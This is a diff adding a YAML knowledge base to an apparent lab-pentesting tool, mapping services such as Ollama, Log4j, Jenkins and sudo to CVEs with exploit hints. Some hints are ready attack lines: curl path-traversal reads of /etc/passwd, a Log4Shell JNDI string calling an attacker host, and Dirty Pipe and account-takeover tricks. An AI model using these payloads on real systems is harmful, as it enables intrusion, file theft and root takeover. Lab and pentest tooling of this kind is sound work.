@@ -1,0 +1,185 @@
+# Yhwach — offline CPE/version -> CVE knowledge base.
+#
+# Curated for the services that actually turn up in OSAI / OSCP-style labs, with
+# the AI-stack CVEs first (Yhwach doctrine ranks AI hosts above traditional).
+# `yhwach vulns` matches each `software` row against these entries and records a
+# `vulnerability` row; entries with an `exploit` also emit an `exploitable_cve`
+# finding so the exploit_known_cve rule can chain.
+#
+# Match:  entry matches a software row when (product substring in software.name
+#         OR cpe substring in software.cpe), case-insensitive, AND the software
+#         version satisfies `affected`.
+# affected grammar:  "<x" "<=x" ">x" ">=x" "==x", comma-AND ranges (">=2.0,<2.17.1"),
+#         or "*" (any version — version-agnostic, e.g. an unauth-by-default service).
+
+# ---- AI stack (ranked first) ------------------------------------------------
+- product: ollama
+  cpe: ollama
+  affected: "<0.1.34"
+  cve: CVE-2024-37032
+  cvss: 9.8
+  title: "Ollama path traversal -> RCE (Probllama)"
+  exploit: "msf: exploit/linux/http/ollama_path_traversal_rce; nuclei CVE-2024-37032"
+
+- product: mlflow
+  cpe: mlflow
+  affected: "<2.9.2"
+  cve: CVE-2023-6014
+  cvss: 9.8
+  title: "MLflow auth bypass -> LFI / RCE"
+  exploit: "searchsploit mlflow; nuclei CVE-2023-6014"
+
+- product: ray
+  cpe: ray
+  affected: "<2.8.1"
+  cve: CVE-2023-48022
+  cvss: 9.8
+  title: "Ray Jobs API unauth RCE (ShadowRay)"
+  exploit: "msf: exploit/linux/http/ray_jobs_api_rce; /api/jobs/ command injection"
+
+- product: gradio
+  cpe: gradio
+  affected: "<4.11.0"
+  cve: CVE-2023-51449
+  cvss: 7.5
+  title: "Gradio /file= path traversal (arbitrary file read)"
+  exploit: "curl '$URL/file=/etc/passwd'"
+
+# ---- Web / app servers ------------------------------------------------------
+- product: apache activemq
+  cpe: activemq
+  affected: "<5.18.3"
+  cve: CVE-2023-46604
+  cvss: 10.0
+  title: "ActiveMQ OpenWire unauth RCE"
+  exploit: "msf: exploit/multi/misc/apache_activemq_rce_cve_2023_46604"
+
+- product: log4j
+  cpe: log4j
+  affected: ">=2.0,<2.17.1"
+  cve: CVE-2021-44228
+  cvss: 10.0
+  title: "Log4Shell JNDI RCE"
+  exploit: "${jndi:ldap://<KALI>/a} in any logged field; marshalsec + payload"
+
+- product: confluence
+  cpe: confluence
+  affected: ">=8.0.0,<8.5.4"
+  cve: CVE-2023-22518
+  cvss: 10.0
+  title: "Confluence improper authz -> takeover"
+  exploit: "nuclei CVE-2023-22518; /json/setup-restore.action"
+
+- product: gitlab
+  cpe: gitlab
+  affected: ">=16.1.0,<16.7.2"
+  cve: CVE-2023-7028
+  cvss: 10.0
+  title: "GitLab account takeover via password reset"
+  exploit: "reset to attacker email (double email[] param)"
+
+- product: jenkins
+  cpe: jenkins
+  affected: "<2.442"
+  cve: CVE-2024-23897
+  cvss: 9.8
+  title: "Jenkins CLI arbitrary file read (-> RCE)"
+  exploit: "msf: auxiliary/scanner/http/jenkins_cli_arbitrary_file_read"
+
+- product: grafana
+  cpe: grafana
+  affected: ">=8.0.0,<8.3.1"
+  cve: CVE-2021-43798
+  cvss: 7.5
+  title: "Grafana plugin path traversal (LFI)"
+  exploit: "curl '$URL/public/plugins/alertlist/../../../../../../etc/passwd'"
+
+- product: httpd
+  cpe: apache:http_server
+  affected: ">=2.4.49,<=2.4.50"
+  cve: CVE-2021-41773
+  cvss: 9.8
+  title: "Apache httpd path traversal -> RCE"
+  exploit: "msf: exploit/multi/http/apache_normalize_path_rce"
+
+- product: tomcat
+  cpe: tomcat
+  affected: "<9.0.31"
+  cve: CVE-2020-1938
+  cvss: 9.8
+  title: "Tomcat AJP file read/inclusion (Ghostcat)"
+  exploit: "msf: auxiliary/admin/http/tomcat_ghostcat (AJP 8009)"
+
+- product: webmin
+  cpe: webmin
+  affected: "<1.920"
+  cve: CVE-2019-15107
+  cvss: 9.8
+  title: "Webmin password_change unauth RCE"
+  exploit: "msf: exploit/linux/http/webmin_backdoor"
+
+# ---- Services / OS ----------------------------------------------------------
+- product: openssh
+  cpe: openssh
+  affected: ">=8.5,<9.8"
+  cve: CVE-2024-6387
+  cvss: 8.1
+  title: "OpenSSH signal-handler race RCE (regreSSHion)"
+  exploit: "PoC public; hard/unstable — verify version+glibc first"
+
+- product: samba
+  cpe: samba
+  affected: ">=3.5.0,<4.6.4"
+  cve: CVE-2017-7494
+  cvss: 9.8
+  title: "Samba is_known_pipename RCE (SambaCry)"
+  exploit: "msf: exploit/linux/samba/is_known_pipename"
+
+- product: vsftpd
+  cpe: vsftpd
+  affected: "==2.3.4"
+  cve: CVE-2011-2523
+  cvss: 9.8
+  title: "vsftpd 2.3.4 backdoor"
+  exploit: "msf: exploit/unix/ftp/vsftpd_234_backdoor"
+
+- product: proftpd
+  cpe: proftpd
+  affected: "==1.3.5"
+  cve: CVE-2015-3306
+  cvss: 10.0
+  title: "ProFTPD mod_copy unauth file copy -> RCE"
+  exploit: "SITE CPFR/CPTO to web root"
+
+- product: exim
+  cpe: exim
+  affected: ">=4.87,<4.92"
+  cve: CVE-2019-10149
+  cvss: 9.8
+  title: "Exim deliver_message RCE (The Return of the WIZard)"
+  exploit: "msf: exploit/linux/smtp/exim4_deliver_message"
+
+# ---- Local privilege escalation (post-foothold software rows) ----------------
+- product: sudo
+  cpe: sudo
+  affected: ">=1.8.2,<1.9.5p2"
+  cve: CVE-2021-3156
+  cvss: 7.8
+  title: "sudo heap overflow -> root (Baron Samedit)"
+  exploit: "searchsploit sudo baron samedit; exact libc-dependent PoC"
+
+- product: polkit
+  cpe: polkit
+  affected: "<0.120"
+  cve: CVE-2021-4034
+  cvss: 7.8
+  title: "polkit pkexec local root (PwnKit)"
+  exploit: "PwnKit PoC (blasty/berdav) — near-universal Linux local root"
+
+- product: linux kernel
+  cpe: linux:linux_kernel
+  affected: ">=5.8,<5.16.11"
+  cve: CVE-2022-0847
+  cvss: 7.8
+  title: "Linux kernel pipe overwrite -> root (Dirty Pipe)"
+  exploit: "Dirty Pipe PoC; overwrite /etc/passwd or a SUID binary"
